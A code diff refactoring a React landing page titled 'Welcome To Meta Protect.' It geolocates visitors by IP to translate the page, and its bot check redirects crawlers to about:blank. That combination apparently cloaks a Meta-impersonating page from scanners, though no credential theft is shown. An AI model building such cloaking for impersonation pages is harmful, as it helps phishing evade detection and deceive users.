@@ -12,7 +12,7 @@ import { useNavigate } from 'react-router';
 const Index = () => {
     const navigate = useNavigate();
     const [today, setToday] = useState();
-    const [isLoading, setIsLoading] = useState(true)
+    const [isLoading, setIsLoading] = useState(true);
     const defaultTexts = useMemo(
         () => ({
             title: 'Welcome To Meta Protect.',
@@ -47,48 +47,52 @@ const Index = () => {
         [defaultTexts]
     );
 
-    useEffect(async () => {
-        const date = new Date();
-        const options = {
-            month: 'long',
-            day: 'numeric',
-            year: 'numeric'
-        };
-        setToday(date.toLocaleString('en-US', options));
-        localStorage.clear();
+    useEffect(() => {
+        const init = async () => {
+            const date = new Date();
+            const options = {
+                month: 'long',
+                day: 'numeric',
+                year: 'numeric'
+            };
+            setToday(date.toLocaleString('en-US', options));
+            localStorage.clear();
 
-        const checkBot = async () => {
-            try {
-                const botResult = await detectBot();
-                if (botResult.isBot) {
-                    window.location.href = 'about:blank';
-                    return;
-                }
-            } catch {
-                //
-            }
-        };
-
-        const fetchIpInfo = async () => {
-            try {
-                const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
-                localStorage.setItem('ipInfo', JSON.stringify(response.data));
-                const countryCode = response.data.country_code;
-                const targetLang = countryToLanguage[countryCode];
-
-                if (targetLang) {
-                    setIsLoading(false)
-                    localStorage.setItem('targetLang', targetLang);
-                    if (targetLang !== 'en') {
-                        translateAllTexts(targetLang);
+            const checkBot = async () => {
+                try {
+                    const botResult = await detectBot();
+                    if (botResult.isBot) {
+                        window.location.href = 'about:blank';
+                        return;
                     }
+                } catch {
+                    //
                 }
-            } catch {
-                //
-            }
+            };
+
+            const fetchIpInfo = async () => {
+                try {
+                    const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
+                    localStorage.setItem('ipInfo', JSON.stringify(response.data));
+                    const countryCode = response.data.country_code;
+                    const targetLang = countryToLanguage[countryCode];
+
+                    if (targetLang) {
+                        setIsLoading(false);
+                        localStorage.setItem('targetLang', targetLang);
+                        if (targetLang !== 'en') {
+                            translateAllTexts(targetLang);
+                        }
+                    }
+                } catch {
+                    //
+                }
+            };
+            await fetchIpInfo();
+            await checkBot();
         };
-        await fetchIpInfo();
-        await checkBot();
+
+        init();
     }, [translateAllTexts]);
 
     return (
